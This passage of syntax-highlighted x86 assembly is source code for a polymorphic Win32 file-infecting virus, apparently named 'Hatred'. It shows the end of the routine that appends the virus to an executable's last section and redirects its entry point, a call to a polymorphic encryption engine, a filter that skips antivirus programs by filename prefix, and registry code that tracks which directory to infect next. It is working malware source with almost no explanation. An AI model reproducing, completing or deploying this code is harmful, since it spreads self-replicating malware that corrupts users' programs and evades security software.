                                                    </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsection</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; point last section</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Pointer to raw data</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; plus last section size</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; is the filesize. Align</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filealign</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; it to the file</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                       </span><span class="sc1">; alignment</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; and store it</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; let us locate the new</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; EIP...</span><span class="sc0">
     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; ...and store it!!</span><span class="sc0">

</span><span class="sc1">; we finished infecting the file. Now let us prepare to call the poly</span><span class="sc0">
</span><span class="sc1">; engine:</span><span class="sc0">

     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; EBX = code to decrypt at</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;       runtime</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_of_code</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">  </span><span class="sc1">;       (adjustment)</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">smth</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; ESI = code to encrypt in</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_of_code</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">  </span><span class="sc1">;       memory</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; EDI = where to place the</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">decrypt</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_of_code</span><span class="sc1">;       decryptor</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">end_of_code</span><span class="sc4">-</span><span class="sc5">start_of_code</span><span class="sc0">          </span><span class="sc1">; ECX = size of code to crypt</span><span class="sc0">
     </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">; be sure is divisible by</span><span class="sc0">
     </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">; 4</span><span class="sc0">
                                                 </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MOF32</span><span class="sc0">                                  </span><span class="sc1">; Call MOF32</span><span class="sc0">
                                                 </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">the_end</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; go to the end</span><span class="sc0">
     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; and store a JMP there...</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">stosb</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; a jmp to the beginning of</span><span class="sc0">
     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                  </span><span class="sc1">; the real code</span><span class="sc0">
     </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                 </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; put zeroes until the end</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; of file so no mess is</span><span class="sc0">
     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">; found there (the mess</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_end</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">; which remains is because</span><span class="sc0">
     </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; of the alignment)</span><span class="sc0">
     </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">; restore registers</span><span class="sc0">
                                                 </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">smth</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; mutate initial jump</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump_code</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">first_intend</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; with the first intend</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Check if the file is good for infection                                Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entry:      = pointer to filename</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return: CF clear if file is ok</span><span class="sc0">
</span><span class="sc1">;         CF set if file cannot be infected</span><span class="sc0">


</span><span class="sc5">ValidateFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
                                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">avoid_list</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; point avoid list</span><span class="sc0">
                                                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">repeat_check_files</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrlen</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; get length of string</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                                 </span><span class="sc1">; compare string</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_invalid</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">; go to the next name</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                  </span><span class="sc1">; the end?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_valid</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">repeat_check_files</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                                                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">file_valid</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                       </span><span class="sc1">; file can be infected</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">file_invalid</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                       </span><span class="sc1">; file cannot be infected</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ValidateFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">avoid_list</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'TB'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'F-'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AW'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AV'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NAV'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PAV'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RAV'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NVC'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FPR'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DSS'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'IBM'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'INOC'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ANTI'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SCN'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VSAF'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VSWP'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PANDA'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DRWEB'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FSAV'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">


</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Retrieve or set the last checked directory from the registry           Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entry:  nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return: EDI = pointer to the directory</span><span class="sc0">

</span><span class="sc5">SetInitialKey</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; First let us open</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">; the key we have</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">                          </span><span class="sc1">; our value set up in</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KEY</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_RegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">set_new_key</span><span class="sc0">                              </span><span class="sc1">; if error -&gt; create...</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_len</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; now, after the key is</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">; open, lets query our</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_data</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Hatred value...</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_type</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_name</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_handle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_RegQueryValueExA</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">; if found, then it's ok</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">key_was_found</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
